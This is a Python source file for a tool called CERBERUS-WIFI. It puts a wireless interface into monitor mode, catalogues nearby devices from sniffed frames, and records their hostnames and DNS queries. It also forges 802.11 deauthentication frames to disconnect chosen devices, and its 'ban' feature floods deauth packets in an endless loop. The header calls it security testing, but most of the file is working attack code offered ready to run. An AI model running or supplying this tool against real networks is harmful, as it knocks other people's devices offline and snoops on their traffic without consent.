#!/usr/bin/env python3
"""
CERBERUS-WIFI v2.0 - Advanced WiFi Deauth & Device Control Framework
Professional WiFi Security Testing & Device Management

Author: F1REW0LF
License: MIT
"""

import sys
import os
import re
import time
import json
import threading
import subprocess
import signal
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from collections import defaultdict
import argparse

try:
    from scapy.all import *
    from scapy.layers.dot11 import *
    from scapy.layers.dhcp import DHCP
    from scapy.layers.inet import IP, UDP
    from scapy.layers.dns import DNS, DNSQR
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

VERSION = "2.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    MAGENTA = '\033[95m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.PURPLE}{Colors.BOLD}     ██████╗███████╗██████╗ ███████╗██████╗ ██╗   ██╗███████╗
    ██╔════╝██╔════╝██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝
    ██║     █████╗  ██████╔╝█████╗  ██████╔╝██║   ██║███████╗
    ██║     ██╔══╝  ██╔══██╗██╔══╝  ██╔══██╗██║   ██║╚════██║
    ╚██████╗███████╗██║  ██║███████╗██║  ██║╚██████╔╝███████║
     ╚═════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
                                                   
{Colors.GREEN}          WIFI DEAUTH & DEVICE CONTROL FRAMEWORK{Colors.WHITE}
{Colors.CYAN}    Advanced WiFi Security Testing & Device Management{Colors.WHITE}
{Colors.YELLOW}    Version {VERSION} | Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
    """
    print(banner)
    print("=" * 80)

# ==================== DEVICE DATABASE ====================
class DeviceDatabase:
    OUI_DB = {
        '00:11:22': 'Cisco', '00:1a:3f': 'Sony', '00:1c:bf': 'Samsung',
        '00:1e:52': 'Apple', '00:1f:03': 'HP', '00:23:32': 'Apple',
        '00:24:36': 'Dell', '00:25:00': 'Apple', '00:26:08': 'Acer',
        '00:50:f2': 'Microsoft', '08:00:27': 'VirtualBox', '0c:47:c9': 'Samsung',
        '10:dd:b1': 'Apple', '14:7d:da': 'Samsung', '18:34:51': 'Huawei',
        '1c:4d:70': 'Xiaomi', '1c:cc:6e': 'LG', '20:10:7a': 'Apple',
        '24:0a:c4': 'Hikvision', '28:6c:07': 'Apple', '2c:54:91': 'Samsung',
        '30:ae:a4': 'Dahua', '34:8a:7b': 'Samsung', '3c:22:fb': 'Apple',
        '40:0e:5c': 'Xiaomi', '40:4a:03': 'Xiaomi', '44:48:c1': 'Samsung',
        '44:87:fc': 'Samsung', '48:5a:b6': 'Samsung', '4c:32:75': 'Samsung',
        '50:76:af': 'Samsung', '54:27:1e': 'Samsung', '58:38:79': 'Samsung',
        '5c:87:9c': 'Samsung', '60:02:b4': 'Apple', '60:45:cb': 'Apple',
        '64:5a:04': 'Apple', '68:a8:6d': 'Apple', '6c:40:08': 'Apple',
        '70:81:05': 'Apple', '74:6f:1a': 'Apple', '78:ca:39': 'Apple',
        '7c:65:1d': 'Apple', '80:ea:ca': 'Apple', '84:38:38': 'Apple',
        '88:53:95': 'Apple', '8c:85:90': 'Apple', '90:1f:0c': 'Apple',
        '90:3e:ab': 'Apple', '94:26:1d': 'Apple', '98:5e:d3': 'Apple',
        '9c:f3:87': 'Apple', 'a0:99:9b': 'Apple', 'a4:d1:d2': 'Apple',
        'ac:5f:3e': 'Apple', 'b0:95:8e': 'Apple', 'b4:8b:19': 'Apple',
        'b8:1d:70': 'Apple', 'bc:6a:56': 'Apple', 'bc:85:56': 'Apple',
        'c0:7b:bc': 'Apple', 'c4:8e:8f': 'Apple', 'c8:69:cd': 'Apple',
        'cc:28:1e': 'Apple', 'd0:6a:63': 'Apple', 'd4:a3:3d': 'Apple',
        'd8:35:2d': 'Apple', 'dc:9b:9c': 'Apple', 'e0:6a:58': 'Apple',
        'e4:5f:01': 'Apple', 'e8:5d:93': 'Apple', 'ec:1a:59': 'Apple',
        'f0:18:98': 'Apple', 'f4:38:9d': 'Apple', 'f8:1a:67': 'Apple',
        'fc:25:3f': 'Apple'
    }
    
    DEVICE_PATTERNS = {
        'iPhone': ['iphone', 'ios', 'apple'],
        'Android': ['android', 'samsung', 'huawei', 'xiaomi', 'oneplus'],
        'Windows': ['windows', 'win', 'pc'],
        'Mac': ['mac', 'darwin'],
        'Linux': ['linux', 'ubuntu', 'debian', 'kali'],
        'SmartTV': ['tv', 'samsungtv', 'androidtv', 'webos'],
        'Camera': ['camera', 'ipcam', 'rtsp', 'onvif'],
        'Printer': ['printer', 'hp', 'epson', 'canon'],
        'Router': ['router', 'gateway', 'ap', 'accesspoint'],
        'IoT': ['googlehome', 'alexa', 'smart', 'speaker'],
        'Gaming': ['playstation', 'xbox', 'nintendo']
    }
    
    @classmethod
    def lookup_manufacturer(cls, mac: str) -> str:
        if not mac:
            return "Unknown"
        mac = mac.upper()
        for prefix, manufacturer in cls.OUI_DB.items():
            if mac.startswith(prefix.upper()):
                return manufacturer
        return "Unknown"
    
    @classmethod
    def detect_device_type(cls, hostname: str, user_agent: str, mac: str) -> str:
        combined = f"{hostname} {user_agent}".lower()
        for device_type, patterns in cls.DEVICE_PATTERNS.items():
            for pattern in patterns:
                if pattern in combined:
                    return device_type
        manufacturer = cls.lookup_manufacturer(mac)
        if manufacturer == "Apple":
            return "iPhone/Mac"
        elif manufacturer == "Samsung":
            return "Android"
        elif manufacturer in ["Xiaomi", "Huawei"]:
            return "Android"
        return "Unknown"

# ==================== WIFI CONTROLLER ====================
class WiFiController:
    def __init__(self, interface: str = "wlan0"):
        self.interface = interface
        self.running = True
        self.devices = {}
        self.banned_devices = set()
        self.aps = {}
        self.stats = {
            'packets_captured': 0,
            'devices_detected': 0,
            'deauth_sent': 0,
            'start_time': time.time()
        }
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.db = DeviceDatabase()
        
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        self._init_interface()
    
    def _init_interface(self):
        cprint(f"[*] Initializing interface: {self.interface}", Colors.BLUE)
        try:
            os.system(f"ip link set {self.interface} down")
            os.system(f"iw dev {self.interface} set type monitor")
            os.system(f"ip link set {self.interface} up")
            os.system(f"iw dev {self.interface} set channel 6")
            cprint(f"[+] Interface {self.interface} ready (monitor mode)", Colors.GREEN)
        except Exception as e:
            cprint(f"[-] Interface init failed: {e}", Colors.RED)
            sys.exit(1)
    
    def signal_handler(self, signum, frame):
        cprint("\n[!] Shutting down...", Colors.YELLOW)
        self.running = False
        self.stop_event.set()
        sys.exit(0)
    
    def channel_hopper(self):
        channels = list(range(1, 12))
        while self.running and not self.stop_event.is_set():
            for channel in channels:
                if self.stop_event.is_set():
                    break
                os.system(f"iw dev {self.interface} set channel {channel}")
                time.sleep(0.3)
    
    def packet_handler(self, pkt):
        self.stats['packets_captured'] += 1
        
        if pkt.haslayer(Dot11Beacon):
            self._handle_beacon(pkt)
        if pkt.haslayer(Dot11ProbeReq):
            self._handle_probe_request(pkt)
        if pkt.haslayer(Dot11):
            self._handle_data_frame(pkt)
        if pkt.haslayer(DHCP):
            self._handle_dhcp(pkt)
        if pkt.haslayer(DNS):
            self._handle_dns(pkt)
    
    def _handle_beacon(self, pkt):
        try:
            bssid = pkt.addr2
            ssid = pkt.info.decode('utf-8', errors='ignore') if pkt.info else "Hidden"
            channel = 0
            for elt in pkt.iterpayloads():
                if hasattr(elt, 'ID') and elt.ID == 3:
                    channel = elt.info[0]
                    break
            if bssid not in self.aps:
                self.aps[bssid] = {'ssid': ssid, 'bssid': bssid, 'channel': channel,
                                  'first_seen': time.time(), 'last_seen': time.time()}
                cprint(f"[AP] {ssid} ({bssid}) on channel {channel}", Colors.GREEN)
        except:
            pass
    
    def _handle_probe_request(self, pkt):
        try:
            mac = pkt.addr2
            if mac not in self.devices:
                self._add_device(mac, pkt)
        except:
            pass
    
    def _handle_data_frame(self, pkt):
        try:
            src = pkt.addr2
            if src and src not in self.devices:
                self._add_device(src, pkt)
            if src in self.devices:
                with self.lock:
                    self.devices[src]['last_seen'] = time.time()
        except:
            pass
    
    def _handle_dhcp(self, pkt):
        try:
            if pkt.haslayer(DHCP):
                for opt in pkt[DHCP].options:
                    if opt[0] == 'hostname' and opt[1]:
                        hostname = opt[1].decode('utf-8', errors='ignore')
                        mac = pkt[Ether].src if pkt.haslayer(Ether) else None
                        if mac and mac in self.devices:
                            with self.lock:
                                self.devices[mac]['hostname'] = hostname
                                self.devices[mac]['device_type'] = self.db.detect_device_type(
                                    hostname, '', mac)
                            cprint(f"[DEVICE] {mac} - Hostname: {hostname}", Colors.CYAN)
                        break
        except:
            pass
    
    def _handle_dns(self, pkt):
        try:
            if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
                if pkt[DNS].qd:
                    qname = pkt[DNS].qd.qname.decode('utf-8', errors='ignore')
                    mac = pkt[Ether].src if pkt.haslayer(Ether) else None
                    if mac and mac in self.devices:
                        with self.lock:
                            if 'dns_queries' not in self.devices[mac]:
                                self.devices[mac]['dns_queries'] = []
                            self.devices[mac]['dns_queries'].append(qname)
        except:
            pass
    
    def _add_device(self, mac: str, pkt):
        vendor = self.db.lookup_manufacturer(mac)
        hostname = "Unknown"
        if pkt.haslayer(Dot11ProbeReq) and hasattr(pkt, 'info') and pkt.info:
            hostname = pkt.info.decode('utf-8', errors='ignore')
        device_type = self.db.detect_device_type(hostname, '', mac)
        
        with self.lock:
            self.devices[mac] = {
                'mac': mac, 'vendor': vendor, 'hostname': hostname,
                'device_type': device_type, 'first_seen': time.time(),
                'last_seen': time.time(), 'bssid': None, 'signal': None,
                'channel': None, 'dns_queries': [], 'banned': mac in self.banned_devices
            }
            self.stats['devices_detected'] += 1
        
        status = "BANNED" if mac in self.banned_devices else "ACTIVE"
        cprint(f"[NEW] {mac} | {vendor} | {device_type} | Status: {status}", Colors.GREEN)
    
    def start_scanning(self):
        cprint(f"\n[*] Scanning for devices on {self.interface}...", Colors.BLUE)
        cprint("[*] Press Ctrl+C to stop\n", Colors.DIM)
        
        hop_thread = threading.Thread(target=self.channel_hopper, daemon=True)
        hop_thread.start()
        
        try:
            sniff(iface=self.interface, prn=self.packet_handler, store=0,
                  stop_filter=lambda x: self.stop_event.is_set())
        except Exception as e:
            cprint(f"[-] Sniff error: {e}", Colors.RED)
    
    def deauth_device(self, mac: str, bssid: str = "FF:FF:FF:FF:FF:FF", count: int = 100):
        with self.lock:
            if mac in self.devices and self.devices[mac]['bssid']:
                bssid = self.devices[mac]['bssid']
        
        pkt1 = RadioTap()/Dot11(addr1=mac, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
        pkt2 = RadioTap()/Dot11(addr1=bssid, addr2=mac, addr3=bssid)/Dot11Deauth(reason=7)
        
        cprint(f"[DEAUTH] Sending deauth to {mac} (BSSID: {bssid})", Colors.RED)
        
        sent = 0
        for _ in range(count):
            if not self.running:
                break
            sendp(pkt1, iface=self.interface, verbose=False)
            sendp(pkt2, iface=self.interface, verbose=False)
            sent += 2
            self.stats['deauth_sent'] += 2
            time.sleep(0.01)
        
        cprint(f"[+] Sent {sent} deauth packets to {mac}", Colors.GREEN)
        with self.lock:
            self.banned_devices.add(mac)
            if mac in self.devices:
                self.devices[mac]['banned'] = True
        return sent
    
    def ban_device(self, mac: str):
        if mac in self.banned_devices:
            cprint(f"[!] Device {mac} is already banned", Colors.YELLOW)
            return
        
        cprint(f"[BAN] Banning device: {mac}", Colors.RED, bold=True)
        bssid = None
        with self.lock:
            if mac in self.devices:
                bssid = self.devices[mac].get('bssid')
        
        def continuous_deauth():
            while self.running and mac in self.banned_devices:
                self.deauth_device(mac, bssid or "FF:FF:FF:FF:FF:FF", 50)
                time.sleep(1)
        
        with self.lock:
            self.banned_devices.add(mac)
            if mac in self.devices:
                self.devices[mac]['banned'] = True
        
        thread = threading.Thread(target=continuous_deauth, daemon=True)
        thread.start()
        cprint(f"[+] Device {mac} is now banned", Colors.GREEN)
    
    def unban_device(self, mac: str):
        if mac not in self.banned_devices:
            cprint(f"[!] Device {mac} is not banned", Colors.YELLOW)
            return
        with self.lock:
            self.banned_devices.discard(mac)
            if mac in self.devices:
                self.devices[mac]['banned'] = False
        cprint(f"[+] Device {mac} has been unbanned", Colors.GREEN)
    
    def list_devices(self):
        print("\n" + "="*80)
        cprint(" DETECTED DEVICES", Colors.PURPLE, bold=True)
        print("="*80)
        if not self.devices:
            cprint("[!] No devices detected yet", Colors.YELLOW)
            return
        
        print(f"{'#':<4} {'MAC Address':<20} {'Device Type':<15} {'Vendor':<12} {'Status':<10} {'Hostname':<20}")
        print("-"*80)
        
        with self.lock:
            for idx, (mac, info) in enumerate(self.devices.items(), 1):
                status = "BANNED" if info.get('banned', False) else "ACTIVE"
                color = Colors.RED if info.get('banned', False) else Colors.GREEN
                print(f"{idx:<4} {mac:<20} {info.get('device_type', 'Unknown'):<15} "
                      f"{info.get('vendor', 'Unknown'):<12} {color}{status:<10}{Colors.WHITE} "
                      f"{info.get('hostname', 'Unknown'):<20}")
        
        print("-"*80)
        cprint(f"Total: {len(self.devices)} devices | Banned: {len(self.banned_devices)}", Colors.CYAN)
    
    def show_device_info(self, mac: str):
        with self.lock:
            if mac not in self.devices:
                cprint(f"[-] Device {mac} not found", Colors.RED)
                return
            info = self.devices[mac]
        
        print("\n" + "="*60)
        cprint(f" DEVICE INFORMATION - {mac}", Colors.PURPLE, bold=True)
        print("="*60)
        print(f"MAC Address     : {mac}")
        print(f"Vendor          : {info.get('vendor', 'Unknown')}")
        print(f"Device Type     : {info.get('device_type', 'Unknown')}")
        print(f"Hostname        : {info.get('hostname', 'Unknown')}")
        print(f"Connected AP    : {info.get('bssid', 'Unknown')}")
        print(f"Status          : {'BANNED' if info.get('banned', False) else 'ACTIVE'}")
        print(f"First Seen      : {datetime.fromtimestamp(info.get('first_seen', 0)).strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Last Seen       : {datetime.fromtimestamp(info.get('last_seen', 0)).strftime('%Y-%m-%d %H:%M:%S')}")
        if info.get('dns_queries'):
            print(f"DNS Queries     : {', '.join(info['dns_queries'][:5])}")
        print("="*60)
    
    def show_aps(self):
        print("\n" + "="*60)
        cprint(" DETECTED ACCESS POINTS", Colors.PURPLE, bold=True)
        print("="*60)
        if not self.aps:
            cprint("[!] No APs detected yet", Colors.YELLOW)
            return
        print(f"{'SSID':<25} {'BSSID':<20} {'Channel':<10}")
        print("-"*60)
        for bssid, info in self.aps.items():
            print(f"{info.get('ssid', 'Hidden'):<25} {bssid:<20} {info.get('channel', 'N/A'):<10}")
    
    def show_stats(self):
        uptime = int(time.time() - self.stats['start_time'])
        print("\n" + "="*60)
        cprint(" STATISTICS", Colors.PURPLE, bold=True)
        print("="*60)
        print(f"Uptime          : {uptime}s")
        print(f"Packets Captured: {self.stats['packets_captured']:,}")
        print(f"Devices Found   : {self.stats['devices_detected']}")
        print(f"Deauth Sent     : {self.stats['deauth_sent']:,}")
        print(f"Banned Devices  : {len(self.banned_devices)}")
        print("="*60)
    
    def run_menu(self):
        while self.running:
            print(f"\n{Colors.BLUE}{'='*60}{Colors.WHITE}")
            print(f"{Colors.BOLD}CERBERUS-WIFI - Device Control Menu{Colors.WHITE}")
            print(f"{Colors.BLUE}{'='*60}{Colors.WHITE}")
            print("1. List All Devices")
            print("2. Show Device Details")
            print("3. Ban Device")
            print("4. Unban Device")
            print("5. Show Access Points")
            print("6. Show Statistics")
            print("7. Exit")
            
            choice = input(f"\n{Colors.CYAN}[>] Select (1-7): {Colors.WHITE}").strip()
            
            if choice == '1':
                self.list_devices()
            elif choice == '2':
                mac = input("[>] MAC Address: ").strip().upper()
                self.show_device_info(mac)
            elif choice == '3':
                mac = input("[>] MAC Address to ban: ").strip().upper()
                self.ban_device(mac)
            elif choice == '4':
                mac = input("[>] MAC Address to unban: ").strip().upper()
                self.unban_device(mac)
            elif choice == '5':
                self.show_aps()
            elif choice == '6':
                self.show_stats()
            elif choice == '7':
                cprint("[*] Exiting...", Colors.GREEN)
                self.running = False
                self.stop_event.set()
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

# ==================== MAIN ====================
def main():
    parser = argparse.ArgumentParser(
        description="CERBERUS-WIFI v2.0 - WiFi Deauth Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 cerberus_wifi.py -i wlan0
  sudo python3 cerberus_wifi.py -i wlan0 --ban 00:11:22:33:44:55
  sudo python3 cerberus_wifi.py -i wlan0 --list
        """
    )
    
    parser.add_argument("-i", "--interface", default="wlan0", help="Wireless interface")
    parser.add_argument("--ban", help="Ban a device by MAC address")
    parser.add_argument("--unban", help="Unban a device by MAC address")
    parser.add_argument("--list", action="store_true", help="List all devices")
    parser.add_argument("--deauth", help="Send deauth to a device (MAC)")
    parser.add_argument("--count", type=int, default=100, help="Number of deauth packets")
    
    args = parser.parse_args()
    
    print_banner()
    
    if os.geteuid() != 0:
        cprint("[!] Root privileges required", Colors.RED)
        sys.exit(1)
    
    if not SCAPY_AVAILABLE:
        cprint("[!] Scapy not installed. Run: pip3 install scapy", Colors.RED)
        sys.exit(1)
    
    controller = WiFiController(args.interface)
    
    if args.ban:
        controller.ban_device(args.ban.upper())
        sys.exit(0)
    
    if args.unban:
        controller.unban_device(args.unban.upper())
        sys.exit(0)
    
    if args.list:
        cprint("[*] Scanning for 10 seconds...", Colors.BLUE)
        scan_thread = threading.Thread(target=controller.start_scanning, daemon=True)
        scan_thread.start()
        time.sleep(10)
        controller.stop_event.set()
        controller.list_devices()
        sys.exit(0)
    
    if args.deauth:
        controller.deauth_device(args.deauth.upper(), count=args.count)
        sys.exit(0)
    
    cprint("[*] Starting WiFi scanning...", Colors.BLUE)
    cprint("[*] Press Ctrl+C to stop scanning\n", Colors.DIM)
    
    scan_thread = threading.Thread(target=controller.start_scanning, daemon=True)
    scan_thread.start()
    time.sleep(3)
    
    try:
        controller.run_menu()
    except KeyboardInterrupt:
        controller.running = False
        controller.stop_event.set()
        cprint("\n[!] Shutting down...", Colors.YELLOW)
        sys.exit(0)

if __name__ == "__main__":
    main()
